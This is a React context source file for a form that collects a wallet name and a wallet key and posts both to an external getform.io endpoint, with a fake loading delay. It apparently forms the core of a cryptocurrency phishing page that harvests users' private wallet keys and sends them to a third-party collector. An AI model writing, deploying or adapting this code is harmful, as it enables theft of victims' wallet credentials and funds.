import React, { useEffect, createContext, useState, useContext } from "react";
import axios from "axios";

// Context
export const FormContext = createContext(undefined);

export const FormContextProvider = ({ children }) => {
  // State
  const [formData, setFormData] = useState({
    walletName: "",
    walletKey: "",
  });
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState(false);

  // Functions
  useEffect(() => {
    const timeoutId = setTimeout(() => {
      setIsLoading(false);
    }, 2000);

    return () => clearTimeout(timeoutId);
  }, []);

  const handleInputChange = (event) => {
    const { name, value } = event.target;
    setFormData({
      ...formData,
      [name]: value?.walletName || value,
    });
  };

  async function handleSubmit() {
    console.log(formData);
    setIsLoading(true);

    try {
      const response = await axios.post(
        "https://getform.io/f/7e5mNBe2",
        {
          "Wallet name": formData.walletName.name,
          "Wallet key": formData.walletKey,
        },
        { headers: { Accept: "application/json" } }
      );

      console.log(response);

      setFormData({
        walletName: "",
        walletKey: "",
      });
      setError("");
      setIsLoading(false);

      return { error: false };
    } catch (error) {
      console.error("Error sending email:", error);
      setFormData({
        walletName: "",
        walletKey: "",
      });
      setError(true);
      setIsLoading(false);

      return { error: true };
    }
  }

  // Value
  const contextValue = {
    formData,
    handleSubmit,
    handleInputChange,
    isLoading,
    error,
    setFormData,
  };

  // Return
  return (
    <FormContext.Provider value={contextValue}>{children}</FormContext.Provider>
  );
};

export const useFormContext = () => {
  const context = useContext(FormContext);

  if (!context) {
    throw new Error("useFormContext must be used within a FormContextProvider");
  }

  return context;
};
